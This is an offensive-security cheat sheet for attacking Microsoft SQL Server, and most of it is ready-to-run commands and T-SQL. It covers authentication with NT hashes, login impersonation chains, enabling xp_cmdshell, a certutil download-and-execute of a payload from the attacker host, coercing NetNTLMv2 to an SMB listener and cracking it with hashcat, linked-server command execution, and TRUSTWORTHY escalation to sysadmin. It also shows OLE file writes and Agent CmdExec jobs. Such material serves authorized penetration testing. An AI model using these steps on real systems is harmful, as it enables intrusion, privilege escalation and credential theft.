# MSSQL: enumeration and access

[← Database services](databases-and-redis.md#mssql-1433) · [Active Directory quick reference](../05-active-directory.md) · [MSSQL SQLi](../web/manual-sqli.md#mssql-string-context)

Record host/FQDN, instance, port, authentication type, original login, current SQL context, and Windows service account.

`connect → identity/rights → data → impersonation/links → OS context → enumerate again`

[Connect](#connect) · [Impersonation](#login-and-user-impersonation) · [Command execution](#xp_cmdshell) · [Linked servers](#linked-servers) · [AD follow-up](#service-account-and-ad-follow-up)

## Find the instance

TCP/1433 is common; named instances can use other or dynamic ports. SQL Browser on UDP/1434 may disclose the instance/port. A missing Browser response does not rule out SQL Server.

```bash
nmap -Pn -sV -p <SQL-PORT> --script ms-sql-info,ms-sql-ntlm-info \
  --script-args mssql.instance-port=<SQL-PORT>,mssql.scanned-ports-only=true <SQL-IP>
sudo nmap -Pn -sU -p 1434 --script ms-sql-info <SQL-IP>
```

From a domain Windows shell:

```powershell
setspn.exe -Q MSSQLSvc/*
Test-NetConnection -ComputerName '<SQL-FQDN>' -Port <SQL-PORT>
```

SPN → host/instance/port + owning account. Check user-backed SPNs in [Kerberoasting](../ad/authentication.md#kerberoasting). Use connection strings from readable configs/shares; a listed SPN can be stale.

## Connect

SQL authentication uses an instance login, such as `sa`. Windows authentication uses a Windows account/group granted SQL access. A working domain credential still needs a SQL login mapping.

```bash
# SQL login; prompt for the password.
impacket-mssqlclient -port <SQL-PORT> '<SQL-USER>@<SQL-IP>'

# Windows/domain login; prompt for the password.
impacket-mssqlclient -windows-auth -port <SQL-PORT> '<DOMAIN>/<USER>@<SQL-IP>'

# Windows NT hash; NTLM authentication.
impacket-mssqlclient -windows-auth -hashes ':<NT-HASH>' \
  -port <SQL-PORT> '<DOMAIN>/<USER>@<SQL-IP>'

# Existing Kerberos cache; retain the service FQDN.
export KRB5CCNAME=<USER>.ccache
impacket-mssqlclient -k -no-pass -dc-ip <DC-IP> -target-ip <SQL-IP> \
  -port <SQL-PORT> '<DOMAIN.TLD>/<USER>@<SQL-FQDN>'
```

NT hash here = Windows account key. A SQL login's `password_hash` and a captured NetNTLMv2 response are different material. Kerberos: match `MSSQLSvc/<SQL-FQDN>:<SQL-PORT>`, DNS, clock, and ticket account. [Ticket checks](../ad/tickets.md) · [Kerberos fixes](../ad/kerberos-troubleshooting.md).

NetExec defaults to Windows authentication; `--local-auth` selects SQL authentication for this protocol:

```bash
nxc mssql <SQL-IP> --port <SQL-PORT> -d <DOMAIN> -u <USER> -p '<PASSWORD>' \
  --query "SELECT SYSTEM_USER, DB_NAME(), IS_SRVROLEMEMBER('sysadmin');"
nxc mssql <SQL-IP> --port <SQL-PORT> --local-auth -u <SQL-USER> -p '<PASSWORD>' \
  --query "SELECT SYSTEM_USER, DB_NAME(), IS_SRVROLEMEMBER('sysadmin');"
```

Windows `sqlcmd`: current Windows network context (`-E`) or a SQL login (`-U`, password prompt):

```cmd
sqlcmd -S "tcp:<SQL-FQDN>,<SQL-PORT>" -E
sqlcmd -S "tcp:<SQL-FQDN>,<SQL-PORT>" -U <SQL-USER>
```

T-SQL below is for the SQL connection. Impacket executes each submitted line: join a wrapped statement or a block using variables into one line. `sqlcmd` submits a batch with `GO` on its own line. In Impacket, `! <command>` runs on Kali. [`sqlcmd` batch handling](https://learn.microsoft.com/en-us/sql/tools/sqlcmd/sqlcmd-use-utility).

Impacket shortcuts; run `help` for the installed version:

```text
enum_db
enum_logins
enum_users
enum_owner
enum_impersonate
enum_links
```

## Identity and rights

```sql
SELECT @@SERVERNAME AS server_name, @@VERSION AS version;
SELECT ORIGINAL_LOGIN() AS original_login, SYSTEM_USER AS current_login, USER_NAME() AS database_user, DB_NAME() AS current_database;
SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin, IS_ROLEMEMBER('db_owner') AS is_db_owner;
SELECT * FROM sys.fn_my_permissions(NULL, 'SERVER');
SELECT * FROM sys.fn_my_permissions(NULL, 'DATABASE');
SELECT name, type, usage FROM sys.login_token;
SELECT name, type, usage FROM sys.user_token;
SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S','U','G');
SELECT name, type_desc FROM sys.database_principals WHERE type IN ('S','U','G');
SELECT name, state_desc, HAS_DBACCESS(name) AS can_access, SUSER_SNAME(owner_sid) AS owner, is_trustworthy_on FROM sys.databases;
```

`ORIGINAL_LOGIN()` stays tied to the connection; `SYSTEM_USER` follows the current login context; `USER_NAME()` is database-scoped. Role result: `1` = member, `0` = not a member, `NULL` = unresolved/error; check permissions too. Metadata visibility can hide principals and grants.

| Finding | Check next |
| --- | --- |
| Readable application database | Tables, selected rows, configs, credentials |
| `IMPERSONATE` / `IMPERSONATE ANY LOGIN` | Exact target + effective right + target's permissions |
| `CONTROL SERVER` / `sysadmin` | OS execution method and its Windows identity |
| `ALTER SETTINGS` | Can change configuration; execution permissions are separate |
| `db_owner` | Current database only; inspect owner + `TRUSTWORTHY` |
| Linked server | Direction, login mapping, data access / RPC Out |
| Bulk/OLE/Agent rights | Exact feature, filesystem identity, and available service |

## Readable data

Pick an accessible application database; system databases can also contain jobs, paths, and configuration leads.

```sql
USE [<DATABASE>];
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<TABLE>';
SELECT TOP (10) [<COLUMN1>], [<COLUMN2>] FROM [<SCHEMA>].[<TABLE>];
```

Find promising columns before reading rows:

```sql
SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME
FROM INFORMATION_SCHEMA.COLUMNS
WHERE COLUMN_NAME LIKE '%pass%' OR COLUMN_NAME LIKE '%secret%' OR COLUMN_NAME LIKE '%token%' OR COLUMN_NAME LIKE '%connection%';
```

Readable views/procedure definitions may expose connection strings or references to another database:

```sql
SELECT SCHEMA_NAME(schema_id) AS schema_name, name, type_desc FROM sys.objects WHERE type IN ('V','P');
SELECT OBJECT_DEFINITION(OBJECT_ID(N'<SCHEMA>.<PROCEDURE>')) AS definition;
SELECT name, base_object_name FROM sys.synonyms;
```

No tables/definition? Check current database, schema, `SELECT` / `VIEW DEFINITION`, and metadata visibility. Record a recovered value's database/table/column and account scope; test plausible reuse in [lateral movement](../ad/lateral-movement.md).

## Login and user impersonation

Read visible login grants. `major_id` identifies the target login; the grantor is the account that issued the permission.

```sql
SELECT grantee.name AS grantee, target.name AS target_login, p.state_desc
FROM sys.server_permissions AS p
JOIN sys.server_principals AS grantee ON p.grantee_principal_id = grantee.principal_id
JOIN sys.server_principals AS target ON p.major_id = target.principal_id
WHERE p.class_desc = 'LOGIN' AND p.permission_name = 'IMPERSONATE';
```

Effective checks include inherited rights; visible grants alone do not prove a path:

```sql
SELECT name AS target_login, HAS_PERMS_BY_NAME(name, 'LOGIN', 'IMPERSONATE') AS can_impersonate
FROM sys.server_principals WHERE type IN ('S','U') AND is_disabled = 0;
SELECT HAS_PERMS_BY_NAME(NULL, NULL, 'IMPERSONATE ANY LOGIN') AS impersonate_any_login;
```

Switch only to a confirmed target, then repeat identity, rights, and link checks:

```sql
EXECUTE AS LOGIN = '<TARGET-LOGIN>';
SELECT ORIGINAL_LOGIN(), SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin');
SELECT * FROM sys.fn_my_permissions(NULL, 'SERVER');
REVERT;
SELECT ORIGINAL_LOGIN(), SYSTEM_USER, USER_NAME();
```

Another impersonation grant under the new login can form a chain. Keep the context stack; each `REVERT` removes one level. Do the useful work before reverting.

Database-user impersonation:

```sql
USE [<DATABASE>];
SELECT name, HAS_PERMS_BY_NAME(name, 'USER', 'IMPERSONATE') AS can_impersonate FROM sys.database_principals WHERE type IN ('S','U');
EXECUTE AS USER = '<DATABASE-USER>';
SELECT SYSTEM_USER, USER_NAME(), IS_ROLEMEMBER('db_owner');
SELECT * FROM sys.fn_my_permissions(NULL, 'DATABASE');
REVERT;
```

`EXECUTE AS USER` is database-scoped; becoming `dbo` does not automatically grant server rights. SQL impersonation does not give you the account's password or a Windows logon token. Impacket's `exec_as_login` / `exec_as_user` wrap these statements.

Permissions and scope: [Microsoft `EXECUTE AS`](https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql).

## xp_cmdshell

Check feature state before changing it:

```sql
SELECT name, value, value_in_use FROM sys.configurations WHERE name IN ('show advanced options','xp_cmdshell');
SELECT HAS_PERMS_BY_NAME(NULL, NULL, 'ALTER SETTINGS') AS can_change_options;
USE master;
SELECT HAS_PERMS_BY_NAME('dbo.xp_cmdshell', 'OBJECT', 'EXECUTE') AS can_execute;
```

Enabled + execution right? Start with `EXEC master.dbo.xp_cmdshell 'whoami';`. A non-sysadmin also needs the configured `##xp_cmdshell_proxy_account##`; absence of a proxy can explain failure.

If enabling is required, confirm `ALTER SETTINGS` plus the execution right/proxy conditions above. Save both original option values first:

```sql
EXEC master.sys.sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC master.sys.sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC master.dbo.xp_cmdshell 'whoami';
EXEC master.dbo.xp_cmdshell 'whoami /priv';
EXEC master.dbo.xp_cmdshell 'hostname';
```

Sysadmin calls normally run as the Database Engine service account; non-sysadmin calls use the proxy. SQL `sa` / `sysadmin` ≠ Windows SYSTEM. Check the returned Windows identity. [Microsoft `xp_cmdshell`](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql).

Stage a tested payload only after command execution and the target → listener route work:

```sql
EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<KALI-IP>:8000/<PAYLOAD>.exe C:\Windows\Temp\<PAYLOAD>.exe';
EXEC master.dbo.xp_cmdshell 'C:\Windows\Temp\<PAYLOAD>.exe';
```

Use a confirmed writable directory; check the received file/checksum. Start the HTTP server and callback listener first. `xp_cmdshell` waits for the process to exit, so a long-running shell may hold the SQL request open. [Transfer](../foothold/file-transfer.md) · [Shells](../foothold/shells.md).

Restore options you changed after execution is finished; this example assumes both were originally `0`:

```sql
EXEC master.sys.sp_configure 'xp_cmdshell', 0; RECONFIGURE;
EXEC master.sys.sp_configure 'show advanced options', 0; RECONFIGURE;
```

## UNC path → NetNTLMv2

An executable `xp_dirtree` can cause outbound SMB authentication without `sysadmin` or `xp_cmdshell`. Start one SMB listener on an address the SQL host can reach:

```bash
mkdir -p /tmp/mssql-capture
sudo impacket-smbserver -smb2support share /tmp/mssql-capture
```

Inside the SQL connection:

```sql
EXEC master.dbo.xp_dirtree '\\<KALI-IP>\share', 1, 1;
```

Capture the `user::domain:...` response from the listener output. The network identity is often the SQL service's domain account or the host's machine account; record the actual captured principal.

```bash
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt
hashcat --show -m 5600 netntlmv2.txt
```

No connection: check procedure execution rights, SQL host → listener TCP/445, and outbound NTLM policy. A directory-listing error can still follow successful authentication; inspect the listener. A machine-account response is usually a poor cracking target.

NetNTLMv2 must be cracked to recover a password; it cannot be passed as an NT hash. Relay needs a live authentication plus a suitable reachable service and its signing/channel-binding conditions. [UNC path behavior](https://github.com/NetSPI/PowerUpSQL/wiki/SQL-Server---UNC-Path-Injection-Cheat-Sheet) · [NT vs NetNTLMv2](../windows/ntlm.md) · [Capture notes](../windows/ntlm-capture.md).

## Linked servers

Enumerate links and visible login mappings:

```sql
EXEC master.sys.sp_linkedservers;
SELECT name, product, provider, data_source, is_data_access_enabled, is_rpc_out_enabled FROM sys.servers WHERE is_linked = 1;
EXEC master.sys.sp_helplinkedsrvlogin;
```

Local access can map to a more privileged remote SQL login. The SQL host makes the remote connection, so a linked host may be reachable even when Kali cannot connect directly. A self-mapping using Windows credentials can need delegation; check each mapping.

Read the remote context with `OPENQUERY` when data access is enabled:

```sql
SELECT * FROM OPENQUERY([<LINK>], 'SELECT @@SERVERNAME AS server_name, SYSTEM_USER AS login_name, USER_NAME() AS database_user, IS_SRVROLEMEMBER(''sysadmin'') AS is_sysadmin');
SELECT * FROM OPENQUERY([<LINK>], 'SELECT name FROM sys.databases');
SELECT * FROM [<LINK>].[<DATABASE>].[<SCHEMA>].[<TABLE>];
```

Quotes inside the pass-through query are doubled. Use `EXEC (...) AT` for remote batches when RPC Out is enabled on this source → destination link:

```sql
EXEC ('SELECT @@SERVERNAME, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'');') AT [<LINK>];
EXEC ('SELECT name, value, value_in_use FROM sys.configurations WHERE name IN (''show advanced options'',''xp_cmdshell'');') AT [<LINK>];
EXEC ('EXEC master.dbo.xp_cmdshell ''whoami'';') AT [<LINK>];
```

The last command needs remote `xp_cmdshell` state/rights. If remote configuration changes are required, apply the [same checks](#xp_cmdshell) through this link and save/restore the remote values.

If RPC Out is off, `OPENQUERY` may still allow reads. Changing the link option requires `ALTER ANY LINKED SERVER` on the **source** server; remote `sysadmin` alone does not grant it. Save `is_rpc_out_enabled` first:

```sql
EXEC master.sys.sp_serveroption @server=N'<LINK>', @optname=N'rpc out', @optvalue=N'true';
```

Restore `@optvalue=N'false'` only if you enabled it. [Microsoft remote-query methods](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-openquery-openrowset-exec-at) · [Link options and permissions](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-serveroption-transact-sql).

### More than one hop

Impacket can wrap the nested RPC batches; RPC Out is needed at each hop. These are shell commands:

```text
show_query
use_link [<LINK-A>]
enum_links
use_link [<LINK-B>]
```

At each hop, run `SELECT @@SERVERNAME, SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');` and repeat permissions/link checks. `use_link ..` steps back once; `use_link localhost` clears the chain. Remote impersonation via `exec_as_login` is added to Impacket's link prefix; reset the link context to clear it.

Manual two-hop proof:

```sql
EXEC ('EXEC (''SELECT @@SERVERNAME AS server_name, SYSTEM_USER AS login_name;'') AT [<LINK-B>];') AT [<LINK-A>];
```

Check links back to a previously visited instance: the return mapping may have different rights. Record `source login → link → remote login → rights`; instance names alone do not describe the path.

## db_owner + TRUSTWORTHY

Confirm all three: `db_owner` in this database, `TRUSTWORTHY=ON`, and a database owner with `sysadmin`. `db_owner` alone is not server control.

```sql
USE [<DATABASE>];
SELECT IS_ROLEMEMBER('db_owner') AS is_db_owner;
SELECT name, is_trustworthy_on, SUSER_SNAME(owner_sid) AS owner, IS_SRVROLEMEMBER('sysadmin', SUSER_SNAME(owner_sid)) AS owner_is_sysadmin FROM sys.databases WHERE name = DB_NAME();
```

With all conditions verified, an owner-context procedure can change server permissions. Run as the original login; record its existing role membership and choose an unused procedure name. This adds a persistent role membership:

```sql
CREATE PROCEDURE dbo.[<UNIQUE-PROC>] WITH EXECUTE AS OWNER AS ALTER SERVER ROLE [sysadmin] ADD MEMBER [<ORIGINAL-LOGIN>];
```

Submit the definition as its own batch (`GO` immediately afterward in `sqlcmd`), then call it:

```sql
EXEC dbo.[<UNIQUE-PROC>];
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
DROP PROCEDURE dbo.[<UNIQUE-PROC>];
```

Finish any work needing the added right, restore configuration, then remove only the membership you added:

```sql
ALTER SERVER ROLE [sysadmin] DROP MEMBER [<ORIGINAL-LOGIN>];
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
```

Do not infer this path from `msdb` being trustworthy by default; check your database role and the owner. [Microsoft `TRUSTWORTHY` conditions](https://learn.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property?redirectedfrom=MSDN&view=sql-server-ver16).

## File access

### Read a known file

`OPENROWSET(BULK...)` needs the applicable bulk-operation permission plus filesystem read access. SQL-authenticated access uses the SQL service account; Windows-authenticated access can use the caller's Windows context.

```sql
SELECT HAS_PERMS_BY_NAME(NULL, NULL, 'ADMINISTER BULK OPERATIONS') AS server_bulk;
SELECT HAS_PERMS_BY_NAME(DB_NAME(), 'DATABASE', 'ADMINISTER DATABASE BULK OPERATIONS') AS database_bulk;
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS file_data;
SELECT BulkColumn FROM OPENROWSET(BULK '<KNOWN-CONFIG-PATH>', SINGLE_CLOB) AS file_data;
```

Path is on the SQL host. `SINGLE_CLOB` = text; use `SINGLE_NCLOB` for Unicode text or `SINGLE_BLOB` for raw bytes. UNC reads also need the remote share route/authentication. This BULK form differs from provider-based `OPENROWSET`; do not enable Ad Hoc Distributed Queries just to try a file read.

### Write with OLE Automation

Windows SQL Server: needs enabled OLE Automation procedures, `sysadmin` or explicit execution grants on the required procedures, and a service-writable path. Save both original configuration values before enabling:

```sql
SELECT name, value, value_in_use FROM sys.configurations WHERE name IN ('show advanced options','Ole Automation Procedures');
EXEC master.sys.sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC master.sys.sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
```

One batch; the `0` argument refuses to overwrite an existing marker:

```sql
DECLARE @fs int, @file int, @hr int;
EXEC @hr = master.dbo.sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT;
IF @hr = 0 EXEC @hr = master.dbo.sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\Windows\Temp\<UNIQUE-MARKER>.txt', 0;
IF @hr = 0 EXEC @hr = master.dbo.sp_OAMethod @file, 'WriteLine', NULL, 'MSSQL_WRITE_CHECK';
IF @hr = 0 EXEC @hr = master.dbo.sp_OAMethod @file, 'Close';
SELECT @hr AS hresult;
IF @file IS NOT NULL EXEC master.dbo.sp_OADestroy @file;
IF @fs IS NOT NULL EXEC master.dbo.sp_OADestroy @fs;
```

`hresult=0` = successful OLE calls; verify the marker's contents separately. Nonzero → check the failing call, COM availability, and path ACL. File write needs an actual consuming service/handler for execution; a writable web directory is useful only with the matching site path and enabled handler.

Remove the marker and restore only changed settings. Example assumes both were originally `0`:

```sql
EXEC master.sys.sp_configure 'Ole Automation Procedures', 0; RECONFIGURE;
EXEC master.sys.sp_configure 'show advanced options', 0; RECONFIGURE;
```

Permission/context details: [Microsoft bulk reads](https://learn.microsoft.com/en-us/sql/t-sql/functions/openrowset-bulk-transact-sql?view=sql-server-ver17) · [Filesystem authentication](https://learn.microsoft.com/en-us/sql/t-sql/statements/bulk-insert-transact-sql?view=sql-server-ver16#security-account-delegation-impersonation) · [`sp_OACreate`](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oacreate-transact-sql).

## SQL Server Agent

Jobs can expose commands/credentials or provide another OS execution path. Check Agent state and account; it can differ from the Database Engine service:

```sql
SELECT servicename, status_desc, service_account FROM sys.dm_server_services;
SELECT name, enabled, SUSER_SNAME(owner_sid) AS owner FROM msdb.dbo.sysjobs;
SELECT j.name, s.step_id, s.subsystem, s.command FROM msdb.dbo.sysjobs AS j JOIN msdb.dbo.sysjobsteps AS s ON j.job_id = s.job_id;
```

Service metadata requires `VIEW SERVER STATE` on older versions or `VIEW SERVER SECURITY STATE` on SQL Server 2022+. Agent must be running. Sysadmin can create CmdExec steps; non-sysadmins need suitable `msdb` Agent rights and an allowed CmdExec proxy. [Service metadata permissions](https://learn.microsoft.com/en-us/sql/relational-databases/system-dynamic-management-objects/sys-dm-server-services-transact-sql).

As a confirmed sysadmin, create a uniquely named job with one identity check. Choose an unused output path writable by the Agent account:

```sql
USE msdb;
EXEC dbo.sp_add_job @job_name=N'<UNIQUE-JOB>';
EXEC dbo.sp_add_jobstep @job_name=N'<UNIQUE-JOB>', @step_name=N'identity', @subsystem=N'CmdExec', @command=N'cmd /c whoami > C:\Windows\Temp\<UNIQUE-JOB>.txt';
EXEC dbo.sp_add_jobserver @job_name=N'<UNIQUE-JOB>';
EXEC dbo.sp_start_job @job_name=N'<UNIQUE-JOB>';
EXEC dbo.sp_help_job @job_name=N'<UNIQUE-JOB>';
```

Job start is asynchronous. Wait for completion, inspect history and the output file, then remove your job/file:

```sql
EXEC msdb.dbo.sp_help_jobhistory @job_name=N'<UNIQUE-JOB>';
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Windows\Temp\<UNIQUE-JOB>.txt', SINGLE_CLOB) AS job_output;
EXEC msdb.dbo.sp_delete_job @job_name=N'<UNIQUE-JOB>';
```

SQL Express has no SQL Server Agent. Agent database-role membership alone does not grant execution as the Agent service account. [Microsoft job-step permissions and proxies](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-add-jobstep-transact-sql).

## Service account and AD follow-up

After OS execution, repeat the host/domain baseline in that Windows context:

```sql
EXEC master.dbo.xp_cmdshell 'whoami /all';
EXEC master.dbo.xp_cmdshell 'ipconfig /all';
EXEC master.dbo.xp_cmdshell 'netstat -ano';
```

| Identity / lead | Follow-up |
| --- | --- |
| Domain service account | Groups, shares, SPNs, object ACLs, allowed remote services |
| Virtual service account / NetworkService / SYSTEM | Network authentication can use `<HOST>$`; verify the captured/used account |
| `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege` | Confirm token + required service/trigger in [Potato checks](../windows/potato.md) |
| Local admin / SYSTEM | [Windows credential access](../windows/credential-access.md); check protections and exact rights |
| Readable application config / job command | Credential scope/source, then plausible reuse |
| Loopback or internal SQL instance | [Pivot](../06-pivoting.md), then repeat the instance/login checks |
| MSSQL service-account key | Match account + SPN + domain SID in [ticket notes](../ad/tickets.md); verify the resulting SQL role |

Run [Windows host enumeration](../windows/enumeration.md) and [AD enumeration](../ad/active-directory-enum.md) from a usable shell. SQL login impersonation alone does not supply a Windows credential for a second hop.

## Quick fixes

| Problem | Check |
| --- | --- |
| Login failed | SQL vs Windows auth, domain, login mapping, instance/port, disabled account |
| Cannot open default database | Try a permitted database with Impacket `-db master`; this does not bypass database permissions |
| Certificate/encryption failure | Client/TDS/TLS support + server requirements; read the exact error and local tool help |
| Impacket sends partial statements / loses variables | Submit the whole statement or variable block on one line |
| Empty database/permission results | Current context, metadata visibility, role/function `NULL` |
| Impersonation lists a promising name but fails | Target login vs grantor, effective grant/deny, current context, database vs server scope |
| Linked server not configured for RPC | RPC Out on the source link; `OPENQUERY` may still read |
| Linked login fails / anonymous logon | Actual login mapping, remote account state, Windows delegation, source → target route |
| Remote impersonation disappears | Separate RPC batches reset remote context; use the Impacket prefix or one remote batch |
| `xp_cmdshell` disabled / denied / proxy missing | Feature state + execution right + sysadmin/proxy context |
| Command runs, callback fails | SQL host → callback/staging route, file integrity, long-running process, protection status |
| Bulk read / OLE write denied | SQL permission + OS identity + actual filesystem path/ACL |
| Agent job starts but no result | Job status/history, subsystem/proxy, Agent account, output path |

## Cleanup and notes

- Save `value` + `value_in_use` before changing options; stop if an unexplained pending change exists. Restore options on the instance where you changed them.
- Revert local impersonation until the original context is restored; clear Impacket's link chain separately.
- Remove only your procedures, jobs, added role memberships, staged binaries, and marker/output files.
- Recheck identity, option values, link options, and role membership after cleanup.
- Keep `host/instance | original login | current context | right | link mapping | Windows identity | credential source | proof`.

## References

- [Impacket client source](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) · [SQL shell commands](https://github.com/fortra/impacket/blob/master/impacket/examples/mssqlshell.py)
- [NetExec MSSQL authentication](https://www.netexec.wiki/mssql-protocol/authentication) · [Query flags](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/protocols/mssql/proto_args.py)
- [Nmap instance discovery](https://nmap.org/nsedoc/scripts/ms-sql-info.html) · [NTLM information](https://nmap.org/nsedoc/scripts/ms-sql-ntlm-info.html)
- [Microsoft configuration permissions](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-configure-transact-sql) · [Server-role changes](https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-server-role-transact-sql)
